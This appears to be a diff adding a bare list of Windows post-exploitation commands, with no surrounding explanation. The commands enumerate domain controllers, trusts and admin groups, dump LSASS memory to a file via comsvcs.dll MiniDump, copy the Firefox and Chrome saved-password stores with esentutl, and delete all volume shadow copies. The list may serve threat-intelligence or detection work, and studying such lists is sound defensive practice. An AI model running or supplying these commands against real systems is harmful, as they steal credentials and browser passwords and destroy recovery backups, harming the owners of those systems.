@@ -1,0 +1,13 @@
+nltest /dclist
+nltest /DOMAIN_TRUSTS
+net group “Domain admins” /dom 
+net localgroup “Administrators”
+tasklist
+rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full
+cmd.exe /Q /c esentutl.exe /y
+"C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<firefox_profile_id>.default-release\key4.db" /d
+"C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<firefox_profile_id>.default-release\key4.db.tmp”
+cmd.exe /Q /c esentutl.exe /y
+"C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /d
+"C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data.tmp”
+powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject" 
